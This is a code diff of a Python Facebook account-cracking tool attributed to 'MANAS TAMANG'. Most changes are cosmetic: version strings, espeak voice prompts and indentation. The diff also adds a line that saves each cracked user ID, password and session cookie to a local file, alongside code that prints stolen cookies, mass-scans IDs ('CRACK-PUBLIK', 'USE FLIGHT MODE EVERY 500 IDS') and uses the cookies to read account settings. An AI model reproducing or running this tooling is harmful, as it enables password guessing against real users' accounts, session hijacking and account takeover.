@@ -56,7 +56,7 @@ except ModuleNotFoundError:
 
 #------------------[ GLOBAL VARIABLES ]-------------------#
 
-version='0.1'
+version='OPEN SOURCE'
 file_name=[]
 ugen2=[]
 logincookie=[]
@@ -247,7 +247,7 @@ def info():
  AUTHOR     : MANAS TAMANG
  GITHUB     : MANAS-EXE
  FACEBOOK   : MAN AS
- VERSION    : 0.1
+ VERSION    : \x1b[37m\x1b[38;5;196m{0.0.1}\x1b[37m
 \x1b[37m----------------------------------------------""")
 def banner():
 	print(logo)
@@ -319,6 +319,7 @@ def namepsw():
         with open("data/name.xml", "r") as name_file_obj:
             uname = name_file_obj.readline().strip()
     else:
+    	os.system('espeak -a 300 " Enter,  Your,   Real,  Name,"')
         print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR REAL NAME")
         linex()
         uname = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR NAME : ")
@@ -329,6 +330,7 @@ def namepsw():
         with open("data/password.xml", "r") as password_file_obj:
             upass = password_file_obj.readline().strip()
     else:
+    	os.system('espeak -a 300 " Enter,  Add,   A,  Password,   To,  Your,  Account,"')
         print(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADD A PSW TO YOUR ACCOUNT")
         linex()
         upass = input(" \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ENTER YOUR PASSWORD : ")
@@ -553,7 +555,7 @@ def contact():
 
 def groups():
 	linex()
-	print("NO GROUPS")
+	print("OPEN SOURCE VERSION")
 
 #-------------------[ CRACK-PUBLIK ]----------------#
 
@@ -694,9 +696,8 @@ def passwrd():
 	os.system('clear')
 	banner()
 	info()
-    print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
+	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
 	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
-    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUSE FLIGHT MODE FOR SPEED UP ')
 	linex()
 	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
 	linex()
@@ -810,8 +811,9 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
-                print(f'\033[1;93m [🇳🇵] COOKIE  \033[1;92m : '+kuki)
+                print(f'\033[1;93m   [🇳🇵] COOKIE (1) \033[1;92m : '+kuki)
                 #os.system#@('espeak -a 300 " MANAS,  Ok,  id"')
+                open('/sdcard/MANAS/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                 cek_apk(session,coki)
                 break
                 
@@ -823,7 +825,7 @@ def crack(idf,pwv):
  
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
-
+	
 def cek_apk(session,coki):
     w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
